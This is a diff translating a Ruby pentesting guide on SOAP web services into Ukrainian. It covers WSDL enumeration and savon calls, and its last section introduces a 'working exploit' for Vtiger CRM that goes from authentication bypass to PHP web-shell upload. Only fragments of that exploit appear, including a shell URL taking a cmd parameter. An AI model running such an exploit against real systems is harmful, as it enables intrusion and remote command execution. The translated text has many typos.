@@ -1,13 +1,13 @@
-# Interacting with Web Services
+# Взаємодія з вебсервісами
 
 ### SOAP - WSDL
-Generally speaking, dealing with SOAP means dealing with XML messages and a WSDL file (also XML) that describes how to use a given SOAP API. Ruby has really elegant way to do so and let's to get our hand dirty with an exploit
+Вцілому, робота з SOAP означає роботу з XML повідомленняси та WSDL файлами(які також є підтипом XML) що описують як використовувати наданий SOAP API. Рубі має дуєе елегантний спосіб зробити це тож давайте забруднемо руки написавши експлойт:
 
 ```
 gem install wasabi savon httpclient 
 ```
 
-#### Enumeration
+#### Розкриття
 
 ```ruby
 require 'wasabi'
@@ -39,7 +39,7 @@ document.parser.document.element_children.children[1].children[1].children[3].ch
 
 ```
 
-Results
+Результат:
 
 ```ruby
 >> url = "http://www.webservicex.net/CurrencyConvertor.asmx?WSDL"
@@ -80,7 +80,7 @@ Results
 => {:FromCurrency=>{:name=>"FromCurrency", :type=>"Currency"}, :ToCurrency=>{:name=>"ToCurrency", :type=>"Currency"}}
 ```
 
-#### Interaction 
+#### Взаємодія
 
 ```ruby
 require 'savon'
@@ -94,7 +94,7 @@ response = client.call(:conversion_rate, message: message).body
 response[:conversion_rate_response][:conversion_rate_result]
 ```
 
-Results
+Результат:
 
 ```ruby
 >> message = {'FromCurrency' => 'EUR', 'ToCurrency' => 'CAD'}
@@ -106,9 +106,10 @@ Results
 ```
 
 
-#### Hacking via SOAP vulnerabilities 
+#### Атака за допомогою вразливостей в SOAP  
 
-This is a working exploit for Vtiger CRM SOAP from auth-bypass to shell upload 
+Далі йде робочий експлойт для SOAP від Vtiger CRM що надає можливсті атаківати починаючи з auth-bypass закінчуючи завантаженням шелів
+
 ```ruby
 #!/usr/bin/env ruby
 # KING SABRI | @KINGSABRI
@@ -147,7 +148,7 @@ response = client.call( :add_email_attachment,
 puts "[+] PHP Shell on:  http://#{URI.parse(url).host}/vtigercrm/soap/#{shell_name}?cmd=id"
 
 ```
-More about [Savon][1]
+Більше про[Savon][1]
 
 
 
